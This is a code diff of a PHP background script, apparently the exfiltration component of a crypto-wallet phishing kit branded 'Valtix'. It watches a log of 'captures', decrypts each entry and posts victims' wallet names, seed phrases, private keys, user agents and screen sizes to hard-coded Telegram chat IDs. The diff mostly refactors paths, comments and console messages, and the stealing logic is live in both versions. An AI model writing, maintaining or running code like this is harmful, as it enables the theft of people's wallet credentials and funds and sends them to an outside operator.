@@ -2,13 +2,13 @@
 /**
  * telegram_sender.php - Background process
  * Reads logs/captures.log and sends new entries to Telegram.
- * Run via: php telegram_sender.php
+ * Run via: php /var/www/html/telegram_sender.php
  */
 
-// Sleep a few seconds at start so other services are ready
+// Small delay to ensure other services are ready
 sleep(3);
 
-$BASE_DIR       = __DIR__;
+$BASE_DIR       = '/var/www/html';
 $LOG_FILE       = $BASE_DIR . '/logs/captures.log';
 $SENT_FILE      = $BASE_DIR . '/logs/sent_tg.log';
 $ERROR_LOG      = $BASE_DIR . '/logs/telegram_errors.log';
@@ -21,7 +21,6 @@ $CHAT_IDS       = [
     '8895304810'
 ];
 
-// Wallet emoji map
 $walletEmoji = [
     'phantom'     => '👻 Phantom',
     'metamask'    => '🦊 MetaMask',
@@ -43,7 +42,7 @@ if (!file_exists($SENT_FILE)) {
 
 echo "[Telegram Sender] Started.\n";
 echo "[Telegram Sender] Watching: {$LOG_FILE}\n";
-echo "[Telegram Sender] Bot token: " . substr($BOT_TOKEN, 0, 20) . "...\n";
+echo "[Telegram Sender] Bot token starts with: " . substr($BOT_TOKEN, 0, 15) . "...\n";
 echo "[Telegram Sender] Chat IDs: " . implode(', ', $CHAT_IDS) . "\n";
 
 $lastChecked = 0;
@@ -53,7 +52,7 @@ while (true) {
 
     if (!file_exists($LOG_FILE)) {
         if (time() - $lastChecked > 30) {
-            echo "[Telegram Sender] Waiting for {$LOG_FILE} to be created...\n";
+            echo "[Telegram Sender] Waiting for {$LOG_FILE}...\n";
             $lastChecked = time();
         }
         sleep(3);
@@ -68,12 +67,17 @@ while (true) {
 
     $lines     = file($LOG_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
     $sentLines = file_exists($SENT_FILE) ? file($SENT_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
-    $newCount  = 0;
+
+    if (empty($lines)) {
+        sleep(3);
+        continue;
+    }
+
+    $newCount = 0;
 
     foreach ($lines as $lineIndex => $rawLine) {
         $lineHash = md5($rawLine);
 
-        // Skip if already sent
         if (in_array($lineHash, $sentLines)) {
             continue;
         }
@@ -88,24 +92,19 @@ while (true) {
         );
 
         if (!$decrypted) {
-            $err = "[!] Failed to decrypt line $lineIndex\n";
-            echo $err;
-            file_put_contents($ERROR_LOG, $err, FILE_APPEND);
-            // Still mark as "sent" so we don't retry forever
+            file_put_contents($ERROR_LOG, "[!] Failed to decrypt line {$lineIndex}\n", FILE_APPEND);
             file_put_contents($SENT_FILE, $lineHash . "\n", FILE_APPEND);
             continue;
         }
 
         $data = json_decode($decrypted, true);
         if (!$data) {
-            $err = "[!] Failed to decode JSON at line $lineIndex\n";
-            echo $err;
-            file_put_contents($ERROR_LOG, $err, FILE_APPEND);
+            file_put_contents($ERROR_LOG, "[!] Failed to decode JSON at line {$lineIndex}\n", FILE_APPEND);
             file_put_contents($SENT_FILE, $lineHash . "\n", FILE_APPEND);
             continue;
         }
 
-        // ---- Extract fields ----
+        // Extract fields
         $walletKey  = strtolower($data['wallet'] ?? '');
         $walletName = $data['walletName'] ?? '';
         $seed       = $data['seed'] ?? $data['seedPhrase'] ?? $data['recoveryPhrase'] ?? '';
@@ -116,7 +115,7 @@ while (true) {
         $ua         = $data['userAgent'] ?? '';
         $screen     = $data['screenSize'] ?? '';
 
-        // Build wallet label with emoji
+        // Wallet label
         if (!empty($walletName)) {
             $walletLabel = "👛 {$walletName}";
         } elseif (isset($walletEmoji[$walletKey])) {
@@ -125,10 +124,9 @@ while (true) {
             $walletLabel = '👛 Unknown';
         }
 
-        // Count seed words
         $wordCount = !empty($seed) ? count(explode(' ', trim($seed))) : 0;
 
-        // ---- Build message ----
+        // Build message
         $message = "🚨 *Valtix — New Capture* 🚨\n";
         $message .= "━━━━━━━━━━━━━━━━━━\n";
         $message .= "💰 *Wallet:* {$walletLabel}\n";
@@ -143,15 +141,15 @@ while (true) {
             $message .= "📝 *Seed:* ❌ None\n";
         }
 
+        $message .= "\n";
+
         if (!empty($pkey)) {
-            $message .= "━━━━━━━━━━━━━━━━━━\n";
             $message .= "🔑 *Private Key:*\n`{$pkey}`\n";
         } else {
             $message .= "🔑 *Private Key:* ❌ None\n";
         }
 
         if (!empty($screen)) {
-            $message .= "━━━━━━━━━━━━━━━━━━\n";
             $message .= "📱 *Screen:* {$screen}\n";
         }
         if (!empty($ua)) {
@@ -161,8 +159,7 @@ while (true) {
         $message .= "━━━━━━━━━━━━━━━━━━\n";
         $message .= "⚡ *Valtix Intelligence*";
 
-        // ---- Send ----
-        $sentOk = true;
+        // Send to all chat IDs
         foreach ($CHAT_IDS as $chatId) {
             $chatId = trim($chatId);
             if (empty($chatId)) continue;
@@ -188,19 +185,17 @@ while (true) {
                 $err = "[!] TG send to {$chatId} failed (HTTP {$http}): " . substr($resp, 0, 200) . "\n";
                 echo $err;
                 file_put_contents($ERROR_LOG, $err, FILE_APPEND);
-                $sentOk = false;
             } else {
                 $newCount++;
-                echo "[✓] Sent to {$chatId} | Wallet: {$walletLabel} | Seed: " . (!empty($seed) ? 'YES' : 'NO') . " | Key: " . (!empty($pkey) ? 'YES' : 'NO') . "\n";
+                echo "[✓] Sent to {$chatId} | Wallet: {$walletLabel} | Seed: " . (!empty($seed) ? 'YES (' . $wordCount . ' words)' : 'NO') . " | Key: " . (!empty($pkey) ? 'YES' : 'NO') . "\n";
             }
         }
 
-        // Mark as sent (even if some failed — avoids infinite retry spam)
         file_put_contents($SENT_FILE, $lineHash . "\n", FILE_APPEND);
     }
 
     if ($newCount > 0) {
-        echo "[Telegram Sender] Sent {$newCount} new captures.\n";
+        echo "[Telegram Sender] Sent {$newCount} new capture(s).\n";
     }
 
     sleep(5);
